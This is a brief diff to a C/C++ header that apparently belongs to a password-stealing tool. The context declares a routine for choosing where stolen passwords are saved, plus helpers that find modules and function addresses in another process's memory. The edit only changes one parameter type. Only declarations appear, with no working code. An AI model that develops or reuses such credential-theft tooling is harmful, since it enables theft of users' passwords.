@@ -32,4 +32,4 @@ void GetFilePathToSaveStealPassword(LPSTR rootPath, LPSTR volumePath, LPSTR file
 
 BOOL GetBaseAddressAndSizeModuleInProcess(HANDLE hProc, LPVOID &base, DWORD &size, LPWCH trueModuleName, int trueModuleNameSize);
 BOOL FullModuleNameIsTrueModuleName(LPWCH moduleName, LPWCH trueModuleName, int trueModuleNameSize);
-BOOL GetFunctionAddressInProcessMemory(HANDLE hProc, LPVOID base, DWORD size, LPVOID &functionAddress, PBYTE bytes, int countBytes);
+BOOL GetFunctionAddressInProcessMemory(HANDLE hProc, LPVOID base, DWORD size, LPVOID &functionAddress, PBYTE bytes, size_t countBytes);
